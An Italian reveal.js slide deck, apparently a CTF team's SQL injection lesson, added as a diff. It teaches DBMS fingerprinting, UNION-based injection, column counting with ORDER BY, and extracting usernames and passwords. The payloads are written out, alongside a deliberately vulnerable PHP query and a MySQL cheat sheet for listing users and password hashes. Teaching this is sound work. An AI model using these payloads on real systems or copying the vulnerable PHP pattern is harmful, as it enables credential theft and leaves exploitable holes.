@@ -1,0 +1,598 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>SQL Injection - Lesson 01 - coppito_zero_day</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>LESSON 01</h4>
+				</section>
+				<section>
+					<h2>'RECON</h2>
+					<p>E' importante indentificare il DBMS che stiamo attaccando.</p>
+					<p>&nbsp;</p>
+					<small class="fragment fade">Tecniche:</small><br />
+					<ul>
+						<li class="fragment fade">Scatenare un errore (non-blind)</li>
+						<li class="fragment fade">Banner grabbing (non-blind)</li>
+						<li class="fragment fade">Inferring from strings (blind)</li>
+					</ul>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+					<h2>'RECON</h2>
+					<h4>Scatenare un errore</h4>
+					<p><center>(non-blind)</center></p>
+
+| Database | Error |
+| --- | ---- |
+| MySQL | `ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1`<br /><br /> |
+| MSSQL | `Microsoft OLE DB Provider for SQL Server error '80040e14'`<br />`Line 1: Incorrect syntax near '1'.`<br /><br /> |
+| Oracle | `ORA-01773:may not specify column datatypes in this CREATE TABLE` |
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+					<h2>'RECON</h2>
+					<h4>Banner grabbing</h4>
+					<p><center>(non-blind)</center></p>
+
+| Database | Query |
+| --- | --- |
+| MySQL | `SELECT version()` <br/> `SELECT @@version`<br /><br />
+| MSSQL | `SELECT @@version`<br /><br />
+| Oracle | `SELECT banner FROM v$version` <br/>`SELECT banner FROM v$version WHERE rownum=1`<br /><br />
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+					<h2>'RECON</h2>
+					<h4>Inferring from strings</h4>
+					<p><center>(blind)</center></p>
+
+| Database | Query |
+| --- | --- |
+| MySQL | `SELECT 'coppito' 'zero' 'day'`<br/>`SELECT CONCAT('coppito','zero','day')`
+| MSSQL | `SELECT 'coppito' + 'zero' + 'day'`
+| Oracle | `SELECT 'coppito' \|\| 'zero' \|\| 'day'` <br/>`SELECT CONCAT('coppito','zero','day')`
+					</textarea>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<p>L'operatore <code>UNION</code> ci consente di combinare il risultato di due o più <code>SELECT</code>.</p>
+					<p><br /></p>
+					<pre class="fragment fade">
+						<code class="hljs sql" data-trim>
+SELECT col1, col2, col3, ..., colN FROM table1
+UNION
+SELECT col1, col2, col3, ..., colN FROM table2
+						</code>
+					</pre>
+					<p class="fragment fade">
+						<small>Ritorna una tabella che contiene i risultanti di entrambe le `SELECT`.</small>
+						<small>Torna solo valori distinti.</small>
+					</p>
+					<p></p>
+					<pre class="fragment fade">
+						<code class="hljs sql" data-trim>
+SELECT col1, col2, col3, ...,colN FROM table1
+UNION ALL
+SELECT col1, col2, col3, ...,colN FROM table2
+						</code>
+					</pre>
+					<small class="fragment fade">Torna anche valori duplicati.</small>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+					<h2>'UNION BASED</h2>
+					<h4>Limitazioni</h4>
+					<br /><br />
+
+- Le query devono avere lo stesso numero di colonne
+- I dati nelle colonne corrispondenti devono essere dello stesso tipo (o compatibili)
+
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+					<h2>'UNION BASED</h2>
+					<h4>Limitazioni</h4>
+					<br />
+
+| DBMS | Error with UNION |
+| ---- | ---- |
+| MSSQL | All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists­<br /><br /> |
+| MySQL | The used SELECT statements have a different number of columns<br /><br /> |
+| Oracle | ORA-01789: query block has incorrect number of result columns<br /><br /> |
+
+<p>Gli errori non ci comunicano qual è il numero di colonne richiesto: dobbiamo fare brute force.</p>
+					</textarea>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>Ottenere il numero di colonne</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' UNION ALL SELECT 1 -- -";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE id = '1' UNION ALL SELECT 1 -- -'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						Fallisce poiché il numero di colonne è differente.
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>Ottenere il numero di colonne</h4>
+					<br />
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' UNION ALL SELECT 1, 2 -- -";
+								$_GET['id'] = "1' UNION ALL SELECT 1, 2, 3 -- -";
+							</code>
+							</pre>
+					</div>
+					<br />
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE id = '1' UNION ALL SELECT 1, 2 -- - FAILS!'
+SELECT `id`, `title`, `content` FROM `pages` WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- - OK!'
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>Ottenere il numero di colonne</h4>
+					<div class="fragment fade">
+						<small>
+							Possiamo ottenere lo stesso risultato usando <code>ORDER BY</code>.<br/>
+							<code>ORDER BY</code> accetta come parametro il nome di una colonna o un numero.
+						</small>
+					</div>
+					<br />
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' ORDER BY 1 -- -";
+							</code>
+							</pre>
+					</div>
+					<br />
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1' ORDER BY 1 -- -' OK!
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1' ORDER BY 2 -- -' OK!
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1' ORDER BY 3 -- -' OK!
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1' ORDER BY 4 -- -' FAILS!
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>Fallisce con <code>4</code> e vuol dire che la tabella ha <code>3</code> colonne.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>Ottenere il numero di colonne</h4>
+					<div class="fragment fade">
+						<small>
+							La tecnica <code>ORDER BY</code> è più rapida con molte colonne.<br/>
+							Può essere utilizzata la ricerca binaria (binary search).
+						</small>
+					</div>
+					<br />
+					<div>
+						<small class="fragment fade">Assumendo una tabella di 15 colonne</small>
+						<ol>
+							<li class="fragment fade">
+<code>ORDER BY 8</code>: no error. Numero di colonne >= 8
+							</li>
+							<li class="fragment fade">
+<code>ORDER BY 16</code>: error. Numero di colonne >= 8 < 16
+							</li>
+							<li class="fragment fade">
+<code>ORDER BY 12</code>: no error. Numero di colonne >= 12 < 16
+							</li>
+							<li class="fragment fade">
+<code>ORDER BY 14</code>: no error. Numero di colonne >= 14 < 16
+							</li>
+							<li class="fragment fade">
+<code>ORDER BY 15</code>: no error. Numero di colonne = 15
+							</li>
+						</ol>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "' UNION ALL SELECT 1, 2, 3 -- -";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1' UNION ALL SELECT 1, 2, 3 -- -'
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						<h2>'UNION BASED</h2>
+						<h4>Esempio</h4>
+						<div class="fragment fade">
+							<br />
+							<br />
+							<center>
+								<small>Risultato:</small>
+							</center>
+
+| id | title | content |
+| ---- | ---- | ---- |
+| 1 | Titolo News | Contenuto News |
+| 1 | 2 | 3 |
+
+						</div>
+					</textarea>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<h4>NON-BLIND COLUMNS</h4>
+					<small><code>SELECT 1,2,3, ..., n</code> è utile anche per identificare l'output che riceviamo.</small>
+					<small>Se viene stampata una sola colonna possiamo usare qualche trucco per ottenere più colonne in un colpo solo.</small>
+					<p><br /></p>
+					<pre class="fragment fade">
+						<code class="hljs sql" data-trim>
+SELECT CONCAT('coppito', 'zero', 'day');
+						</code>
+					</pre>
+					<p class="fragment fade">
+						<small>Torna <code>coppitozeroday</code>.</small>
+					</p>
+					<p></p>
+					<pre class="fragment fade">
+						<code class="hljs sql" data-trim>
+SELECT CONCAT_WS('_', 'coppito', 'zero', 'day');
+						</code>
+					</pre>
+					<p class="fragment fade">
+						<small>Torna <code>coppito_zero_day</code>. Il primo argomento è il separatore.</small>
+					</p>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<small>Assumiamo l'esistenza di un'altra tabella, <code>users</code>, con <code>id</code>,<code>username</code> e <code>password</code>.</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
+  $result = $conn->query($sql);
+  while($row = $result->fetch_array()){
+    echo $row['title'];
+  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Abbiamo già testato il numero di colonne:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "' UNION ALL SELECT 1, 2, 3 -- -";
+							</code>
+						</pre>
+						<small>Questo stamperà anche il nostro <code>2</code></small>
+					</div>
+					<div class="fragment fade">
+						<small>Possiamo stampare anche tutti gli <code>username</code> della tabella <code>users</code>:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "' UNION ALL SELECT 1, username, 3 FROM users -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE id = '1'
+UNION ALL SELECT 1, `username`, 3 FROM `users` -- -'
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<small>Come otteniamo tutta la tabella <code>users</code> in un colpo solo?</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+$_GET['id'] = "' UNION ALL SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1'
+UNION ALL
+SELECT 1, CONCAT_WS('|', `id`, `username`, `password`), 3 FROM `users` -- -'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<div data-markdown>
+							<textarea data-template>
+| title |
+| ----- |
+| Titolo News |
+| 1\|admin\|s3cr3tP4ssw0rd! |
+| 2\|editor\|password |
+| ... |
+| 4\|user\|password1 |
+							</textarea>
+						</div>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<small>Assumiamo l'esistenza di un'altra tabella, <code>users</code>, con <code>id</code>,<code>username</code> e <code>password</code>.</small>
+					<small>Viene stampato solo 1 record</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "' LIMIT 1";
+$result = $conn->query($sql);
+$row = $result->fetch_array();
+print_r($row);
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "' UNION ALL SELECT id, username, password FROM users -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE `id` = '1'
+UNION ALL SELECT `id`, `username`, `password` FROM `users` -- - LIMIT 1'
+							</code>
+						</pre>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<div data-markdown>
+							<textarea data-template>
+| id | title | content |
+| ---- | ---- | ---- |
+| 1 | Titolo News | Contenuto News |
+							</textarea>
+						</div>
+					</div>
+					</div>
+				</section>
+				<section>
+					<h2>'UNION BASED</h2>
+					<small>Dobbiamo aggiungere una condizione che renda sempre falsa la condizione del <code>WHERE</code>, prima della nostra <code>UNION</code>.</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "'AND 1=0 UNION ALL SELECT username, password, 3 FROM users -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT `id`, `title`, `content` FROM `pages` WHERE id = '1' AND 1=0
+UNION ALL
+SELECT `username`, `password`, 3 FROM `users` -- - LIMIT 1'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<div data-markdown>
+							<textarea data-template>
+| id | title | content |
+| ---- | ---- | ---- |
+| admin | password | 3 |
+							</textarea>
+						</div>
+					</div>
+				</section>
+				<section>
+					<h2>CHEATSHEET</h2>
+					<small>Sappiamo come ottenere altri dati tramite una <code>UNION</code> sfruttando una SQLi.</small>
+					<small>Come possiamo scoprire se ci sono altre tabelle? Quali sono i nomi delle colonne? Siamo DBA?</small>
+					<div class="fragment fade">
+						<ul>
+							<li>
+								<small>
+									MYSQL<br />
+									<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">
+										http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+									</a>
+								</small>
+							</li>
+							<li>
+								<small>
+									MSSQL<br />
+									<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">
+										http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+									</a>
+								</small>
+							</li>
+							<li>
+								<small>
+									ORACLE<br />
+									<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">
+										http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+									</a>
+								</small>
+							</li>
+							<li>
+								<small>
+									POSTGRES<br />
+									<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">
+										http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+									</a>
+								</small>
+							</li>
+						</ul>
+					</div>
+					<br />
+					<h2 class="fragment fade">LEARN BY HEART!!!</h2>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						<h2>CHEATSHEET</h2>
+						<h4>Mysql</h4>
+
+| Target | Query |
+| --- | --- |
+| Version | `SELECT @@version`<br/><br/> |
+| Current User | `SELECT user();`<br/>`SELECT system_user();`<br/><br/> |
+| List Users | `SELECT user FROM mysql.user; -- priv`<br/><br/> |
+| List Password Hashes | `SELECT host, user, password FROM mysql.user; — priv`<br/><br/> |
+
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						<h2>CHEATSHEET</h2>
+						<h4>Mysql</h4>
+
+| Target | Query |
+| --- | --- |
+| Version | `SELECT @@version`<br/><br/> |
+| Current Database | `SELECT database()`<br/><br/> |
+| List Databases | `SELECT schema_name FROM information_schema.schemata; -- - for MySQL >= v5.0`<br />`SELECT distinct(db) FROM mysql.db -- - priv`<br/><br/> |
+| List Tables | `SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'`<br/><br/> |
+| List Columns | `SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'`<br/><br/> |
+
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						<h2>CHEATSHEET</h2>
+						<h4>Mysql</h4>
+
+| Target | Query |
+| --- | --- |
+| ASCII value to CHAR | `SELECT char(65); # returns A`<br/><br/> |
+| CHAR value to ASCII | `SELECT ascii('A'); # returns 65`<br/><br/> |
+| String concatenation | `SELECT CONCAT('A','B'); #returns AB`<br/>`SELECT CONCAT_WS(',', 'A','B','C'); # returns A,B,C`<br/><br/> |
+| Avoiding Quotes | `SELECT 0×414243; # returns ABC`<br/><br/> |
+| Hostname, IP | `SELECT @@hostname;`<br/><br/> |
+
+					</textarea>
+				</section>
+				<section>
+					<h2>DEMO</h2>
+				</section>
+				<section>
+					<h2>CHALLENGE</h2>
+					<h4>http://10.10.10.1:8001</h4>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				hash: true,
+				pdfSeparateFragments: false
+			});
+		</script>
+	</body>
+</html>
